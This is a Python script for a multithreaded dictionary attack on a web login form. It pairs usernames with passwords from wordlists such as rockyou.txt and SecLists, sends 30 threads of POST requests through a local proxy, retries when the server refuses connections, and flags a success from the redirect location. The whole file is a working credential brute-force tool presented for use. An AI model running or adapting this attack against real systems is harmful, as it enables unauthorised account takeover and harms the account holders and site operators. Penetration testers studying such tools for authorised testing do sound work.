from requests import session,post,get
import threading
import sys
import code

#SETTINGS
threads_count = 30
userfile="user" #PATH TO FILE
passfile="darkweb2017-top1000.txt" #PATH TO FILE
passfile="/usr/share/wordlists/rockyou.txt"
passfile="/opt/SecLists/Passwords/darkweb2017-top10000.txt"

url="http://" #URL
error_text=""

proxy={"http":"http://127.0.0.1:8080"}
#proxy={}
counter=[0] 
valids=[]

#CREATING DICTIONARY IN MEMORY
users=open(userfile,"r").readlines()
passes=open(passfile,"r").readlines()
userspasses=[]
for u in users:
    for p in passes:
        userspasses.append([u.replace("\n","").strip(),p.replace("\n","").strip()])

#WORKER FUNCTION
def worker(i,userspasses,url,error_text,proxy,valids,counter):
    print("Starting T"+i)
    while len(userspasses) > 0 and len(valids) == 0:
        params=userspasses.pop()
        params={"login":params[0],"haslo":params[1]}
        try:
            #SENDING REQUESTS
            #r = get(url,proxies=proxy)
            r2 = post(url,data=params,proxies=proxy,allow_redirects=False)

            #server sometimes returns 200 with errors containing "Przepraszamy wyst" or "Too many connections"
            while r2.status_code == 200 and (r2.text.__contains__("Przepraszamy wyst") or r2.text.__contains__("Too many connections")):
                r2 = post(url,data=params,proxies=proxy,allow_redirects=False)
            
            #CONDITION  (this specific server returns 302 status code and specific location)
            code=r2.status_code
            location = r2.headers['Location']
            condition = code == 302 and location.strip() == error_text.strip()


            #WRONG PASSWORD
            if condition:
                counter[0]+=1
                print("BAD CREDS\t{}\t(T{})\t{}".format(params,i,counter[0]))
            #CORRECT PASSWORD
            else:
                counter[0]+=1
                print("!!!!SUCCESS!!!!\t{}\t(T{})\t{}".format(params,i,counter[0]))
                valids.append(params)
        except Exception as e:
            print("ERROR {}\t(T{})\t({})\t{}".format(params,i,e,counter[0]))
            continue
            print("Terminating T"+i)

#RUNNING THREADS
threads = []
for i in range(threads_count):
    t = threading.Thread(target=worker,args=(str(i),userspasses,url,error_text,proxy,valids,counter))
    threads.append(t)
    t.start()

#JOINING THREADS
for t in threads:
    t.join()
print("All done.")
